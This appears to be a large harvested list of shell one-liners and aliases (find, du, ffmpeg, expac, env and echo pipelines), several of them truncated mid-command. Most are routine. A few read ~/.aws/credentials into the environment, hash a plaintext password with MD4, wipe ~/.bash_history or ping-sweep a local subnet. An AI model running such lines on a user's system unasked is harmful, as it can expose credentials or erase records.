find . -print0 | cpio -o0 -H newc | gzip -9 > ../ramdisk.img
find . -print | sed -e '/^\.$/d' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
find . -print | grep -v .DS_Store | sed -e
find . -not \( -type d -name .git -prune \) -not \( -type d -name node_modes -prune \) -and \( -type f \)|sort -f|xargs grep --color=always
find . -not -path '*/\.*' | xargs -I {} bash -c 'f={}; echo \$f | sed -e \
find . -name \*.py | grep -v migrations | xargs black -t py37 --line-length=120
find . -name \*.erb -print | sed 'p;s/.erb$/.haml/' | xargs -n2 html2haml
find . -name .git | xargs dirname | xargs -I{} sh -c 'cd {}; echo \
find . -name .#* | xargs rm -f && find . -name *.swp | xargs rm -f
find . -name *.swp | xargs rm -f; find . -name *.*~ | xargs rm -f
find . -name 'build*.xml' | sort | xargs glark $*
find . -name '.git'|sed -e 's/\.git$//g'|xargs -I{} sh -c 'echo -----{}; cd {}; git st'
find . -name '.git'|sed -e 's/\.git$//g'|xargs -I{} sh -c 'echo -----{}; cd {}; git pull'
find . -name '*gradle*' | sort | xargs glark $*
find . -name '*.xml' | sort | xargs glark $*
find . -name '*.xcodeproj' -maxdepth 1 | head -n 1 | xargs open
find . -name '*.wav' -ls | sed -E 's/.*stephendevecchi staff[ \t]+(.*)/\1/' | sort -nr
find . -name '*.txt' | sort | xargs glark $*
find . -name '*.scala' | xargs wc -l | sort
find . -name '*.mp4' | grep -iv sample | xargs -I '{}' mv {} .
find . -name '*.mkv' | grep -iv sample | xargs -I '{}' mv {} .
find . -name '*.m4v' -ls | sed -E 's/.*stephendevecchi staff[ \t]+(.*)/\1/' | sort -nr
find . -name '*.lib.cells' -prune -o -name '*.[ao]' -prune -o -type f -exec p4 fstat {} \; 2>&1 | grep 'no such file' | awk '{print \$1}'
find . -name '*.java' | sort | xargs glark $*
find . -name '*.groovy' | sort | xargs glark $*
find . -name '*.gif' -exec dirname '{}' ';' | uniq | xargs ~/bin/finder_colors.py green
find . -name '*.avi' | grep -iv sample | xargs -I '{}' mv {} .
find . -name '*.[ch]' -type f -exec wc -l {} + | sort -rn | head -n
find . -name '*.[ch]' -o -name '*.java' -o -name '*.template' -o -name '*.template_4_dbg' | grep -v '\.build' | xargs egrep -n
find . -name '*' -type f |grep -v '\.git' | xargs grep --color
find . -name $1 | head -1 | xargs -d '\n' vim
find . -mtime -10 -type f -print | xargs tar cf - | (cd $DEST_DIR; tar xf -)
find . -mtime -1 -print0 | xargs -0 head | xargs -0 ls -lht
find . -mindepth 1 -maxdepth 1 -type f | sed s/'\.\///g' | grep -v '^\.'
find . -mindepth 1 -maxdepth 1 -type d | sed s/'\.\///g' | grep -v '^\.'
find . -mindepth 1 -maxdepth 1 -print0 | xargs -0 du -s | sort -n -r -k 1
find . -mindepth 1 -maxdepth 1 -not -type l -print0 | sed -z 's;^\\./;;' | xargs -0 ls --color -d
find . -maxdepth 4 | grep -i .rar | xargs -I '{}' unrar e -o- {}
find . -maxdepth 3 -type f -print0 | xargs -0 du | sort -nrk 1
find . -maxdepth 3 -type d | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
find . -maxdepth 2 -iname '*out' -type f -not -name 'helix*' -exec rna_rosetta_n.py --verbose {} \; | tee looplog.txt && echo 'sorted' && cat looplog.txt | sort
find . -maxdepth 10 -type d -print | xargs du -sk | sort -rn
find . -maxdepth 1 | fzf | xargs sublime
find . -maxdepth 1 \( ! -regex '.*/\..*' \) -type f -print0 | sed 's/\.\///g' | xargs -0 ls $ls_flags
find . -maxdepth 1 -type l | xargs -i ls -al {} | column -t
find . -maxdepth 1 -type f | cut -d / -f 2 | xargs ls --color=auto
find . -maxdepth 1 -type f | cut -c 3- | sort
find . -maxdepth 1 -type f -print | cut -c 3- | xargs ls
find . -maxdepth 1 -type d | xargs du -sb | sort -n
find . -maxdepth 1 -type d | sed 1d | sed 's/\\.\\///'
find . -maxdepth 1 -type d | fzf | cd
find . -maxdepth 1 -type d -print0 | xargs -0 du -skh | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 du -sk | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 du -sk -h | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 du -sh | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 du -hsk | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 du -hs | sort -rn
find . -maxdepth 1 -type d -print0 | xargs -0 -I{} du -sk {} | sort -nr
find . -maxdepth 1 -type d -print | xargs du -skh | sort -rn
find . -maxdepth 1 -type d -print | xargs du -sk | sort -rn
find . -maxdepth 1 -type d -print | xargs du -shk | sort -rn
find . -maxdepth 1 -type d -print | xargs du -sh | sort -rn
find . -maxdepth 1 -type d -print | xargs du -khs | sort -rn
find . -maxdepth 1 -type d -print | xargs du -hs | sort -rn
find . -maxdepth 1 -type d -and -not -wholename . -print0 | sort -z | xargs -0 du -sh
find . -maxdepth 1 -name '*.xcworkspace' | head -n 1 | xargs open
find . -maxdepth 1 -mindepth 1 | xargs du -sh | sort -rh
find . -maxdepth 1 -exec du -sh '{}' \; | sort -h | grep -vP '^[^\s]+\s\.$'
find . -maxdepth 1 -exec du -ks {} \; | sort -rn | head -n 30
find . -ls | sort -n -k 7 | tail -n 20
find . -ls | sort -n -k 7 | tail -5
find . -iname \*.h | grep -v .svn | xargs grep -Isn --color=auto
find . -iname \*.c | grep -v .svn | xargs grep -Isn --color=auto
find . -iname '*~' | sed -e 's/ /\\ /g' | xargs rm
find . -iname '*.mp3' | while read song; do mpg321 ${song} -w - | oggenc -q 9 -o ${song%.mp3}.ogg -; done
find . -d 1 | sort | tail -n 1
find . -cmin -60 -type f | grep -v chromium | grep -v macromedia
find . ! -empty -type f -exec md5sum {} + | sort | uniq -w32 -dD
find -xdev -type d -exec du -sS \{\} \; | sort -n | tail -n 10
find -x . -iname '*.log' -exec du -sk {} \; | sort -nr | head -n 10
find -type f | grep -v 'git' | sed s:^\./::g > MANIFEST
find -type f -printf '%T+ %p\n' | sort | head -n 30
find -type f -print0 | xargs -r0 stat -c %y\ %n | sort
find -type f -print0 | grep --color=never -Ez '[^/]{5}$' | xargs -0
find -type f -print | xargs wc -l | sort -n
find -type f -path '*src/main*' | fzf | fpp -c idea && wmctrl -a IntelliJ
find -type f -path '*src/main*' | fzf | fpp
find -type f -name BUILD -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG name| grep
find -type f -mtime -2 -printf '%TY-%Td-%Tm %.8TT %p\n' | sort | tail -n 30
find -type f -ls | sort -k7 -r -n | head -20
find -type f -exec du -Sh {} + | sort -rh | less
find -type f -exec du -Sh {} + | sort -rh | head -n 5
find -type f -exec du -Sh {} + | sort -rh | head -n 10
find -type d -printf '%d\t%P\n' | sort -r -nk1 | cut -f2-
find -regextype egrep -regex \.*.p\(m\|l\) -print0 | xargs --null scan_prereqs --combine
find -regextype egrep -regex '.*\.[ch](pp)?$' -exec rosrun roslint cpplint '{}' \; 2>&1 | grep -v 'Total errors' | grep -v 'Done processing'
find -name '*.sql' | sort -V | xargs cat
find -mindepth 2 -links 1 | grep -v ^.*.part$ | sort
find -maxdepth 1 -type f -exec du -sch {} + 2>/dev/null | sort -h | ${MANPAGER}
find -links 1 | grep -v ^.*.part$ | sort
find -E . -regex './(api_core|worker|portal).js' -exec nodemon -e .js {} --configFile ../../config/fullLocal.json \;
find -E . -regex '.*\/(#.*#|.*~)' -print0 |xargs -0 rm
find -E . -regex '.*\.(jpg|gif|png)' -a -size -7k -exec rm '{}' ';'
find -E . -not -regex '\.git($|/)' | g
find err.txt generated.file succ.txt -type f | grep pyc$ | xargs rm
find '/mnt/d/Music/挑歌/可在Google Music挑/' -name *.mp3 | shuf -n 30 | xargs -d '\n' -i mv {} '/mnt/d/Music/挑歌/In Google Music Now'
find ${ST3_PROJECTS} -name \*.sublime-project -type f | sed 's|'\
find $USER_APPLICATIONS_DIR -regex '.*.app' | sed s#$USER_APPLICATIONS_DIR/## | less -P '^ Apps in $USER_APPLICATIONS_DIR'
find $PROJECT -type f -name '*.pyc'|xargs rm -f|echo '.pyc files removed'
find $HOME/music/incoming -maxdepth 1 -type d |shuf --random-source=/dev/urandom -n1|mpc add
find $APPLICATIONS_DIR -regex '.*.app' | sed s#$APPLICATIONS_DIR/## | less -P '^ Apps in $APPLICATIONS_DIR'
find $(pwd) -ls|sort +6n|tail
files-chaged | grep php | xargs -n 1 php-cs-fixer fix
files-chaged | grep php | xargs -n 1 ./phpcs.phar --standard=PSR2 --colors -w -s --warning-severity=0
filecoin deals list --miner | grep staged | wc -l
filecoin deals list --miner | grep rejected | wc -l
filecoin deals list --miner | grep complete | wc -l
filecoin chain ls -l | grep `miner` | grep -v empty
file=`find ~/.dotfiles/ThinkpadX200s -type f | grep -v emacs.d | fzf` && emacs $file & disown %emacs
file err.txt generated.file succ.txt | grep directory | cut -f1 -d:
file err.txt generated.file succ.txt | 'grep' text | awk -F : '{print \$1}'
file '$@' | grep 'binary property list' | cut -d':' -f1
file $(git diff --name-only HEAD~8) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~7) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~6) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~5) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~4) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~3) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~2) | grep -i ASCII | cut -d: -f1
file $(git diff --name-only HEAD~1) | grep -i ASCII | cut -d: -f1
figlet '+1' | cowsay -n | sed -e 's/^/ /'
fgrep -v -f <(adb shell pm list packages |sort) <(adb shell pm list packages -u|sort)
fgrep -v ' <0> ' | fgrep -v '[Y2PM]' | fgrep -v '[wfm]'
fg || vi
fg || if [ $? -eq 1 ]; then exit; fi
fg v || fg vim
fg 2>/dev/null|| emacs
fg %vim || vim
ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le output.wav -an -vcodec libx264 -threads 0 output.mp4
ffmpeg -i http://b-nhkworldtvlive-i.akamaihd.net/hls/live/222468-b/dwstv/index_1180.m3u8 -c copy -f mpegts - | tee output.ts | mplayer -
ffmpeg -i 'concat:1.ts|2.ts|3.ts' -c copy -bsf:a aac_adtstoasc 'out.mp4'
ffmpeg -f x11grab -s `xrandr | grep '*' | awk '{print $1}'` -r 25 -i :0.0 -vcodec qtrle screencast.mov
ffmpeg -f x11grab -s `xdpyinfo | grep dimensions | sed -r
ffmpeg -f x11grab -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -r 25 -i :0.0 -sameq /tmp/out.mpg > /root/howto/capture_screen_video_ffmpeg
ffget -q -O - http://bitcoin-otc.com/otps/4174775D7DDF9DCF | gpg -q | xclip -i
fetch && [ `git rev-parse upstream/master` = `git merge-base HEAD upstream/master` ] && echo yes || echo no
feh $(ls -t1 ~ | grep scrot | head -n 1)
feh $(ls -A | grep -e jpg -e png -e gif| rofi -dmenu)
fd \.js$ src | xargs cat | wc -l
fd -tf index.html ~/configuration/cheatsheets | fzf | xargs -i xdg-open {}
fd --type f --hidden --follow --exclude .git | fzf | xargs -r nvim
fd --color never | fzy | ifne xargs vim; stty sane
fd --color never | fzy | ifne xargs -d
fconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'
fc-list | sed s/:.*//g | sort -u
fc-list | cut -f2 -d: | sort -u
fc-list | cut -d: -f1 | less
fc-list | cut -d':' -f2 | sort -u
fc-list | cut -d ' ' -f2 | sort -u
fc-list | col | sort
fc-list :scalable=true:spacing=mono: family |sort|uniq
fc-list :lang=ja | cut -d: -f1 | less
fc list | an 1 | xargs faas-cli remove
fc -s | tail -n +2 | fpp
fc -ln|tail -n 1|pbcopy
fc -ln|peco|pbcopy
fc -ln -99999 | fzf | read command; eval $command
fc -ln -1 | xargs echo | pbcopy
fc -ln -1 | tr -d '\n' | pbcopy
fc -ln -1 | sed -e 's/\\\\n/\\n/g' -e 's/\\\\t/\\t/g' | cpy
fc -ln -1 | sed '1s/^[[:space:]]*//' | awk 1 ORS=\
fc -ln -1 | cut -c 3- | xclip ; echo yanked prev command
fc -ln -1 | awk '{\$1=\$1}1' | xclip -sel clip
fc -ln -1 | awk '{\$1=\$1}1' | pbcopy
fc -ln -1 | awk '{\$1=\$1}1' | cclip
fc -ln -1 | awk '\''{$1=$1}1'\'' ORS='\'''\'' | pbcopy
fc -l -f 0 | sort -r | peco
fc -l -1 | cut -d' ' -f2- | xargs sudo
fbsimctl --debug-logging record start -- listen -- record stop > /dev/null && fbsimctl --state=booted diagnose | grep video | awk
fasd -f | tr -s ' ' | cut -d ' ' -f 2
fasd -d | tr -s ' ' | cut -d ' ' -f 2
faree | grep Mem | awk '{print $3/$2*100.0}'
facter lsb lsbdistcodename | tail -n 1 | COL3
f(){ ps -a | fzf | awk
f(){ docker stats --no-stream | sort -k$1 -hr | more; }; f
f(){ cheat $@ | fzf | xclip -i}; f
f() { tmux attach -t $1 || tmux -2 new -s $1 };f
f() { docker-compose kill $1 || true && docker-compose rm -f $1 };f
f() { cd $1 &>/dev/null && return || cd ${WORKSPACE}/$1; }; f
expr \`ls -l | wc -l | xargs echo\` - 1
export lst=$(ls | tail -1); export fst=$(ls | head -1)
export ip=$(/sbin/ip -o -4 addr list eno1 | awk '{print $4}' | cut -d/ -f1); echo '$ip'
export SSH_AUTH_SOCK=~/.ssh/ssh_auth_sock; tmux a || tmux
export SSH_AUTH_SOCK=$(tmux showenv | grep SSH_AUTH_SOCK | cut -d = -f 2)
export SSH_AUTH_SOCK=$(find /tmp/ssh-* -user `whoami` -name agent\* | xargs \ls -1tr | tail -n 1)
export PS1=\[\033]0;$(__title_bar)\007\][\u@\h \W$(__git_tags | tail -n1 | perl -pe '
export PATH=`path | edpipe | unpath`
export PATH=$(echo ${PATH} | awk -v RS=: -v ORS=: '/rbenv/ {next} {print}' | sed 's/:*$//')
export GREP_COLOR='1;32'; cat /dev/urandom | hexdump -C | grep --color=auto \
export GREP_COLOR='1;32'; cat /dev/urandom | hexdump -C | grep --color=auto
export GREP_COLOR='1;32' && cat ~/.ssh/config | grep 'Host '|grep --color -E '[^Host].+' && unset GREP_COLOR
export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
export $(cat .env | grep -v ^# | xargs)
explorer.exe . || true
explorer.exe . || :
expac -s '%-30n %m' | sort -rhk 2 | less
expac -S -HM '%k\t%n' | sort -n | tail -n20
expac -S -HM '%k\t%n' | sort -n | tail -n
expac -Q -H M '%m\t%n'|sort -n -r|less
expac -HM --timefmt='%Y-%m-%d %T' '%l\t%-20n\t%m' | sort | tail -n20
expac -HM --timefmt='%Y-%m-%d %T' '%l\t%-20n\t%m' | sort | tail -n
expac -HM '%-20n\t%10d' $(comm -23 <(pacman -Qqt | sort) <(pacman -Qqg base base-devel | sort))
expac -H M --timefmt='%Y-%m-%d' '%m\t%b\t%-30v%n' | sort -rn | less
expac -H M '%m\t%n' | sort -h | less
expac --timefmt='%Y-%m-%d' '%l\t\%n %v' | sort | tail -100
expac --timefmt='%Y-%m-%d' '%l\t%n %v' | sort | tail -100
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 50
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 30
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 20
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 100
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n 10
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -n
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -50
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort | tail -20
expac --timefmt='%Y-%m-%d %T' '%l\t%n %v' | sort | tail -100
expac --timefmt='%F %T' '%l %n' | sort -n | tail -n 20
expac --humansize M '%m\t%n' | sort --human-numeric-sort --reverse | less
expac '%n %m' -l'\n' -Q $(pacman -Qq) | sort -rhk 2 | less
exit|exit|exit
exit || alias quit=return
exim -bp | exiqgrep -i | xargs exim -Mrm
exa || true
exa -l@ --group-directories-first 2>dev/null || ls -l
exa -F | grep '\*' | sed 's/\*$//'
exa --ignore-glob='.DS_Store|*~|*#*' -F -la -b --sort=modified --git --time-style=long-iso
exa --ignore-glob='.DS_Store|*~|*#*' -F -l -b --sort=Name --git --time-style=long-iso
exa --ignore-glob='.DS_Store|*~|*#*' -F -a -b --sort=Name
exa $EXA_FLAGS --git-ignore --tree --recurse --level=2 --ignore-glob='.git|.DS_Store|node_modules'
exa $EXA_FLAGS --git-ignore --tree --recurse --ignore-glob='.git|.DS_Store|node_modules'
eval `ssh-agent` && ssh-add -l &>/dev/null || ssh-add
eval `keychain --agents ssh --eval id_rsa` || exit 1
eval \$(opkg list_installed | sed 's/ - .*//' | sed 's/^/opkg upgrade /')
eval \$(aws-exec-${profile} env | grep AWS | sed 's/^/export /g')
eval 'echo `pwd` | tr -d \\n | pbcopy'; cd
eval $(thefuck $(fc -ln | tail -n 2 |head -n 1)); fc -R
eval $(thefuck $(fc -aln|tail -2|head -n 1))
eval $(history | fzy | awk
eval $(history | cut -c 8-|peco)
eval $(history | cut -c 8- | grep
eval $(history | cut -c 28- | percol)
eval $(env | grep DOCKER | cut -d
eval $(docker-machine env default || docker-machine start default && docker-machine env default)
eval $(docker-machine env DockerOther | sed -n 's/export\s*//gp' | xargs ) docker restart beets
eval $(docker-machine env DockerOther | sed -n 's/export\s*//gp' | xargs ) docker exec -ti beets beet
eval $(cat ~/.aws/credentials | grep aws | awk
et || alias ed=ec
esy add $(cat esy.json | jq '.dependencies | keys[]' -r)
es_stop || true && docker run -d --name henry-es -p 9200:9200 -p 9300:9300 elasticsearch:5.5 -Etransport.host=0.0.0.0 -Ediscovery.zen.minimum_master_nodes=1
erase; history 1 | sed 's#^ *[0-9]* *##' | pbcopy
eos ps | grep $USER | awk
env|sort|grep DOCKER
envchain --list | sort | uniq
env | sort | less -M
env | sort | less
env | sort | grep FACTER_tag
env | sort | grep FACTER
env | sort | grep -i
env | sort | grep -e OCPI -e XILINXD -e LD_LIBRARY -e LM_LICENSE
env | sort | grep -E '^[A-Z_0-9]+'
env | sort | grep
env | sort | bat
env | sort | awk -F =
env | grep proxy | sort
env | grep ^rvm | sort
env | grep ^TRITON | sort
env | grep ^SSH | sort
env | grep ^SDC | sort
env | grep ^NVM | sort
env | grep ^GPG | sort
env | grep ^GEM | sort
env | grep ^DOCKER | sort
env | grep VIRTUAL_ENV | wc -l
env | grep SSH | grep -v ' ' > ~/.ssh-agent.txt && screen
env | grep ROS | grep -v ROS_PACKAGE_PATH
env | grep PATH | tr : '\n'
env | grep OS_ | grep -v PASSWORD
env | grep AWS_ | sort
env | grep -E '^(ORCH_)' | sort
env | grep '^AWS' | xargs -i echo \
env | egrep -iv '(secret|password)'
env | egrep '^LANG|^LC_[A-Z]'
env | args | sort
env TZ=`find /usr/share/zoneinfo -type f -mindepth 2 | cut -d/ -f 5- | peco`
env LC_TIME=C tmux -2 a || tmux -2
env -0 | sort -z | xargs -0 -L1
ensure_n_args 5 $# || return $?
ensure_n_args 4 $# || return $?
ensure_n_args 3 $# || return $?
ensure_n_args 2 $# || return $?
ensure_n_args 1 $# || return $?
ensure_n_args 0 $# || return $?
ensure-empty || return 1
enscript -hr2b'%W|\$N|Page \$% of \$='
enscript -fTimes-Roman12 -b '\$D{%Y-%m-%d %H:%M:%S %z}|%H|(\$%/\$=)' --word-wrap --mark-wrapped-lines=arrow -MLetter
emoji-fzf preview | fzf --preview 'emoji-fzf get --name {1}' | cut -d \
emerge -uDN world || until emerge --resume --skipfirst; do emerge --resume --skipfirst; done
emerge -uDN system || until emerge --resume --skipfirst; do emerge --resume --skipfirst; done
emacsclient -t $@ || (emacs --daemon && emacsclient -t $@)
emacsclient -e '(client-save-kill-emacs)' || killall emacsclient
emacsclient -e '(buffer-list)' | sed -E 's/>( )/\n/g' | tr -d \
emacsclient --no-wait -s '/tmp/emacs-desktop-`wmctrl -d | grep '*' | cut -d ' ' -f1`'/server
emacs `if [ -d .git ]; then; git ls-files | peco; else; find . -type f | peco; fi`
emacs -nw --daemon && emacsclient -nw || emacsclient -nw
elinks -dump randomfunfacts.com | sed -n '/^│ /p' | tr -d \│
elinks -dump randomfunfacts.com | egrep '(^│.*│$)|(^[┌└])'
egrep ^M| awk '{print \$2}' | xargs
egrep -iB4 -A1 'error|erreur|Err: [^0]' $ulog
egrep -iB4 -A1 'error|erreur|Err: [^0]'
egrep -e '(^(>[^>]))|(^(>>[^>]))' $HOME/MISC/CDlist.sfh | sed -e 's/>>/ /g'
egrep 'pac(new|orig|save)' /var/log/pacman.log
egrep '\[migrate|DmMigrationSrc|DmMigrationDst'
egrep '\[error|\[warning|\[normal'
egrep 'Version|URL|Sum'
egrep ""\""version\""|\""balance\""|\""connections\"""" &&
effect=查找最占用空间的20个目录;du -m --max-depth=2 | sort -nr | head -20
eeprom|fgrep banner=|cut -d= -f2
echoip | tr -d '\n' | pbcopy
echo`ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://'`
echo;echo '% dmesg | tail'; echo; dmesg|tail
echo; echo Finding console.logs!; echo; ag -Q console.log -B 2 -A 2 || echo None Found
echo; curl https://icanhazip.com; curl https://api6.ipify.org; echo; echo; curl https://ipinfo.io | json '. |= del(.readme)'
echo' '$cmd $(cmd $($var) | cat -e ) | cat -e'
echo â†’ Systemd Journal Errors | pv -qL 10 && journalctl -b -p err | ccze -A
echo â†’ Listing this system \($(hostname)\) UUID | pv -qL 10 && ls /dev/disk/by-uuid/ -alh | ccze -A
echo â†’ Listing connected drives on \($(hostname)\) | pv -qL 10 && lsblk -f | ccze -A
echo â†’ Listing Units (Systemd) | pv -qL 10 && systemctl list-units | ccze -A
echo â†’ Boot Time | pv -qL 10 && systemd-analyze | ccze -A
echo â†’ Boot Messages | pv -qL 10 && sudo journalctl -b | ccze -A
echo | xclip -i -sel p -f | xclip -i -sel c
echo | tee ~/.bash_history | tee ~/.bash_log
echo | pwd | pbcopy
echo | openssl s_client -connect www.google.com:443 2>/dev/null |openssl x509 -dates -noout
echo | bat --terminal-width=\$(tput cols) --style=grid | head -n1
echo | aud 1st clients | sort -nrk2
echo | aud 15th clients | sort -nrk2
echo {1..20} | xargs -n1 echo | xargs -I'{}' -P10 /usr/bin/php /home/eschmidt/repos/gearman_workers/opt/css/gearman_workers/process_runner/mtmpath/worker
echo x | mail| tail +2
echo vpn.ncsa.illinois.edu | tr -d '\\n' | pbcopy
echo use vi +[LineNum] [file] || vi [file]
echo true || echo false
echo stop | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a338000.pru/remoteproc/remoteproc2/state && echo start | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a338000.pru/remoteproc/remoteproc2/state
echo stop | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a334000.pru/remoteproc/remoteproc1/state && echo start | sudo tee /sys/devices/platform/ocp/4a326004.pruss-soc-bus/4a300000.pruss/4a334000.pru/remoteproc/remoteproc1/state
echo stats | nc localhost 11211 | grep pid
echo show Setup:/Network/BackToMyMac | scutil | sed -n 's/.* : *\(.*\).$/\1/p'
echo origin/$(git branch | grep -e '^*' | cut -d' ' -f2)
echo npm run; npm run \$(npm run | grep -e '^ \w' | fzf --exit-0)
echo listing files & directories by size | pv -qL 10 && ls -lSrh | ccze -A
echo javaprocesslong: ps -aux | grep java; ps -aux | grep java
echo get top process eating memory; echo ps auxf | sort -nr -k 4; ps auxf | sort -nr -k 4
echo get top process eating cpu; echo ps auxf | sort -nr -k 3; ps auxf | sort -nr -k 3
echo fuckyou | repass | xclip
echo find 5 biggest files; find . -type f -exec ls -s {} \; | sort -n -r | head -5
echo files in $PWD: && find . -type fz | wc -l | awk
echo error)"" ""$(history|tail -n1|sed -e "
echo error)"" ""$(history|tail -n1| \
echo error)"" ""$(history | tail -n1 | \
echo `uuidgen` | head -c-1 | xclip -sel clip
echo `pwd` | tr -d '\n' | pbcopy; echo \
echo `pwd` | head -c-1 | xclip -sel clip
echo `ifconfig en4 |grep 10.236|awk '{print $2}'`
echo `ifconfig en0 | grep --color=never 'inet ' | awk '{print $2}'`
echo `ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1' | sed
echo `cat /sys/class/backlight/nvidia_backlight/brightness` - 100 | bc | sudo tee /sys/class/backlight/nvidia_backlight/brightness > /dev/null 2>&1
echo `cat /sys/class/backlight/nvidia_backlight/brightness` + 100 | bc | sudo tee /sys/class/backlight/nvidia_backlight/brightness > /dev/null 2>&1
echo `cat /etc/resolv.conf | grep -v '#' | awk '{print $2}'`
echo `br` | tr -d '\n' | pbcopy
echo \`ifconfig en0 2>/dev/null|awk '/inet / {print $2}'|sed 's/addr://'\`
echo \`git status | grep 'deleted: ' | perl -pne 's{\s*deleted:\s*}{}xms'\`
echo \`git ls-remote --get-url origin | sed -Ee 's@:@/@' -e 's#(git@|git://)#https://#'\`
echo \`curl -s http://orange.tw | sed 's/<br>//' | tr $'\r\n' ' ' \`
echo \`curl --socks4 $TOR -s http://orange.tw | sed 's/<br>//' | tr $'\r\n' ' ' \`
echo \${PATH} | tr ':' '\n' | nl
echo \${FPATH} | tr ':' '\n' | nl
echo \$PATH | tr ':' '\n' | xargs -I {} sh -c \
echo \$PATH | tr ':' '\\n' | sort
echo \$PATH | tr ':' '\\n' | more
echo \$PATH | sed 's/:/ /g' | xargs -n 1 echo
echo \$(cat package.json | jq -S '.scripts' | fzf -i --header='[run:]')
echo You have scored `ls ~/pa3/treasures/gold ~/pa3/treasures/platinum ~/pa3/treasures/diamond ~/pa3/treasures/bracelet 2> ~/X | wc -l | xargs expr 10 \*` points out of 90 possible points.
echo You have scored `ls ~/pa3/treasures/??[alt]* 2> ~/X | wc -l 2> ~/X | xargs expr 10 \* ` points out of 90 possible points.
echo You have scored `ls -1 ~/pa3/treasures/gold ~/pa3/treasures/platinum ~/pa3/treasures/diamond ~/pa3/treasures/bracelet 2> ~/X | wc -l | xargs expr 10 \*` points out of 90 possible points.
echo Running netstat...;netstat -atp tcp | grep -i listen;echo Now running lsof...;lsof -i -P | grep -i listen
echo Power: $(pmset -g batt|awk 'NR==2{print $3}'|sed 's/;//g')
echo Ok. | gpg -e -r 0FD2E91F | gpg -d --use-agent
echo Loading... && du -sh --exclude . --exclude .. err.txt generated.file succ.txt . .. | sort -rh | more -15
echo Drive Space Usage && echo ================= && echo && sudo du -Sh --exclude=./proc --exclude=./run --exclude=./home/.ecryptfs | sort -rh | head -25
echo DONE | text2wave | aplay > /dev/null 2>&1
echo > temp; vim temp && cat temp | gpg --armour --encrypt --hidden-recipient plan@email | pbcopy && rm temp
echo 80 | sudo tee /sys/devices/platform/i8042/serio1/serio2/speed && echo 180 | sudo tee /sys/devices/platform/i8042/serio1/serio2/sensitivity
echo 700000 | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_min_freq;echo 1000000 | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq
echo 5oiR6YOR5a6H5pmo5piv5YK76YC877yM546L5oCd6L+c5piv5oiR54i454i4Cg== | base64 -D | xargs yes
echo 255 | sudo tee /sys/devices/platform/i8042/serio1/serio2/speed | sudo tee /sys/devices/platform/i8042/serio1/serio2/sensitivity
echo 2400000 | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq;echo 2400000 | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_min_freq
echo 192.168.1.{1..254} | xargs -n1 -P0 ping -c1 | grep \
echo 0000:00:14.0 | sudo tee /sys/bus/pci/drivers/xhci_hcd/unbind; sleep 5; echo 0000:00:14.0 | sudo tee /sys/bus/pci/drivers/xhci_hcd/bind
echo /dev/sda9 | sudo tee /sys/power/resume; echo disk | sudo tee /sys/power/state
echo ./$(git rev-parse --show-cdup) || pwd
echo -ne '\033]0;'mplayer'\007'; mplayer -zoom -vo x11 -wid `xwininfo -id $WINDOWID -tree | tail -n 2 | grep -oP '0x[0-9a-f]+ '`
echo -ne '\033[36m'; curl -s randomfunfacts.com | grep '<i>' | sed 's/.*<i>\(.*\)<\/i>.*/\1/'; echo -ne '\033[0m'; tput sgr0
echo -ne '\033[0;34m' && find . -type d -maxdepth 1 -not -name '.' | sed -e 's/\.\///' | column && echo -ne '\033[0m'
echo -n | co && echo -n | xclip -selection primary
echo -n plaintext_password_here | iconv -t utf16le | openssl md4
echo -n listing files & directories by size | pv -qL 10 && ls -lSrh | ccze -A
echo -n `pwd` | xclip -i -sel p -f | xclip -i -f -sel c
echo -n Listing Units | pv -qL 10 && systemctl list-units | ccze -A
echo -n Journal Errors | pv -qL 10 && journalctl -b -p err | ccze -A
echo -n Boot Time | pv -qL 10 && systemd-analyze | ccze -A
echo -n @ && cat /dev/urandom | env LC_CTYPE=C tr -dc 0-9 | head -c 15 && echo
echo -n > ~/.ssh/config && find ~/.ssh/config.d -name '*.config' -print | sort | xargs cat >> ~/.ssh/config
echo -n '¯\_(ツ)_/¯' | xclip -selection clipboard && echo -n '¯\_(ツ)_/¯' | xclip -selection primary && echo '¯\_(ツ)_/¯ copied to X clipboard'
echo -n '¯\_(ツ)_/¯' | tee /dev/tty | pbcopy; echo
echo -n '¯\_(ツ)_/¯' | tee /dev/tty | pbcopy
